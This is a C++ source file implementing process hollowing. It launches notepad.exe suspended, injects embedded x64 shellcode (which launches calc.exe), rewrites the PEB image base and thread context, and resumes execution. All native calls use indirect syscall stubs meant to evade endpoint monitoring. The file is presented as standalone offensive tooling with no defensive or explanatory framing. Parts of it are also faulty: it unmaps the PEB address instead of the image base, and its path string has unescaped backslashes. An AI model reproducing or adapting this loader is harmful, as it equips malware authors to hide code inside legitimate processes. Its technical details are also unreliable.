// ====== PROCESS_HOLLOWING_NTCLOSE.cpp ======
#include <Windows.h>
#include <winternl.h>
#include "syscalls_indirect.h"
#include <vector>
#include <cstring>

#pragma comment(lib, "ntdll.lib")

DWORD GetPebImageBaseOffset() {
#ifdef _WIN64
    return 0x10;  
#else
    return 0x08;  
#endif
}

int main() {

    unsigned char shellcode[] =
        "\x48\x31\xc9\x48\x89\xe0\x48\x83\xe4\xf0\x48\x83\xec\x20\x65\x48"
        "\x8b\x59\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b"
        "\x1b\x4c\x8b\x43\x20\x41\x8b\x5c\x24\x3c\x45\x8b\x9c\x23\x88\x00"
        "\x00\x00\x4c\x01\xc3\x41\x8b\x4b\x20\x4c\x01\xc1\x41\x8b\x53\x24"
        "\x4c\x01\xc2\x41\x8b\x53\x1c\x4c\x01\xc3\x48\x31\xd2\x42\x8b\x3c"
        "\x91\x48\x01\xc7\x48\xb8\x57\x69\x6e\x45\x78\x65\x63\x00\x48\x39"
        "\x07\x74\x04\x48\xff\xc2\xeb\xe9\x41\x0f\xb7\x0c\x52\x41\x8b\x04"
        "\x8b\x48\x01\xc0\x48\x31\xd2\x52\x48\xb8\x63\x61\x6c\x63\x2e\x65"
        "\x78\x65\x50\x48\x89\xe1\xba\x01\x00\x00\x00\xff\xd0\x48\x89\xc4"
        "\xc3";

    SIZE_T shellcodeSize = sizeof(shellcode) - 1;

    wchar_t targetPath[] = L"C:\Windows\System32\notepad.exe";

    HANDLE hProcess, hThread;
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    if (!CreateProcessW(targetPath, NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return 1;
    }

    hProcess = pi.hProcess;
    hThread = pi.hThread;

    PROCESS_BASIC_INFORMATION pbi = { 0 };
    ULONG returnLen = 0;
    NTSTATUS status = Sw3NtQueryInformationProcess(
        hProcess,
        ProcessBasicInformation,
        &pbi,
        sizeof(pbi),
        &returnLen
    );

    if (status != 0) {
        Sw3NtClose(hProcess);
        Sw3NtClose(hThread);
        return 1;
    }

    PVOID imageBase = pbi.PebBaseAddress;

    status = Sw3NtUnmapViewOfSection(hProcess, imageBase);
    if (status != 0) {
        Sw3NtClose(hProcess);
        Sw3NtClose(hThread);
        return 1;
    }
    PVOID newBase = NULL;
    SIZE_T regionSize = shellcodeSize + 0x1000;
    status = Sw3NtAllocateVirtualMemory(
        hProcess,
        &newBase,
        0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (status != 0) {
        Sw3NtClose(hProcess);
        Sw3NtClose(hThread);
        return 1;
    }

    SIZE_T bytesWritten = 0;
    status = Sw3NtWriteVirtualMemory(
        hProcess,
        newBase,
        (PVOID)shellcode,
        shellcodeSize,
        &bytesWritten
    );

    if (status != 0) {
        Sw3NtClose(hProcess);
        Sw3NtClose(hThread);
        return 1;
    }

    DWORD pebOffset = GetPebImageBaseOffset();
    BYTE pebBuffer[0x200] = { 0 };  
    SIZE_T bytesRead = 0;

    status = Sw3NtReadVirtualMemory(
        hProcess,
        pbi.PebBaseAddress,
        pebBuffer,
        sizeof(pebBuffer),
        &bytesRead
    );

    if (status == 0) {
        PVOID* imageBaseAddressPtr = (PVOID*)(pebBuffer + pebOffset);
        *imageBaseAddressPtr = newBase;

        Sw3NtWriteVirtualMemory(
            hProcess,
            pbi.PebBaseAddress,
            pebBuffer,
            sizeof(pebBuffer),
            &bytesWritten
        );
    }

    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_FULL;
    status = Sw3NtGetContextThread(hThread, &ctx);

    if (status != 0) {
        Sw3NtClose(hProcess);
        Sw3NtClose(hThread);
        return 1;
    }

#ifdef _WIN64
    ctx.Rip = (DWORD64)newBase;
#else
    ctx.Eip = (DWORD)newBase;
#endif

    status = Sw3NtSetContextThread(hThread, &ctx);
    if (status != 0) {
        Sw3NtClose(hProcess);
        Sw3NtClose(hThread);
        return 1;
    }

    DWORD oldProtect;
    VirtualProtectEx(hProcess, newBase, regionSize, PAGE_EXECUTE_READ, &oldProtect);

    ULONG prevSuspend = 0;
    status = Sw3NtResumeThread(hThread, &prevSuspend);
    if (status != 0) {
        Sw3NtClose(hProcess);
        Sw3NtClose(hThread);
        return 1;
    }

    Sw3NtClose(hThread);
    Sw3NtClose(hProcess);

    return 0;
}